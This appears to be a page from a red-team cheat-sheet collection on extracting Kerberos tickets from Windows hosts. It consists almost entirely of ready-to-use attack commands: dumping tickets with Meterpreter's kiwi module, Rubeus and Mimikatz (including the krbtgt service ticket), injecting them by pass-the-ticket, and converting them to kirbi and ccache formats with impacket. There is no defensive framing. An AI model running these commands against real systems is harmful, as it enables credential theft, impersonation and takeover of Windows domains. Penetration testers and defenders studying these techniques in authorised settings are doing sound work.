---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/defense-evasion/use-alternate-authentication-material/extract-tickets
---

# Extract Tickets

## Meterpreter

```ruby
meterpreter > kiwi_cmd kerberos::list
meterpreter > kerberos_ticket_list
meterpreter > kiwi_cmd kerberos::list /export
```

## Rubeus

```powershell
C:\> Rubeus.exe triage
C:\> Rubeus.exe dump /service:krbtgt /luid:0x263ab /nowrap
C:\> Rubeus.exe ptt /ticket:[...base64-ticket...]
```

## Mimikatz

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::ptt admin@krbtgt-vulnableone-local.kirbi
```

## Convert Base64 to Kirbi

{% code overflow="wrap" %}
```powershell
[System.IO.File]::WriteALLBytes("C:\Users\Redop\Desktop\admin.kirbi", [System.Convert]::FromBase64String("base64 ticket strings"))
```
{% endcode %}

## Convert Kirbi to Ccache

```python
└─$ impacket-ticketConverter admin.kirbi admin.ccache     
Impacket v0.11.0 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done
```
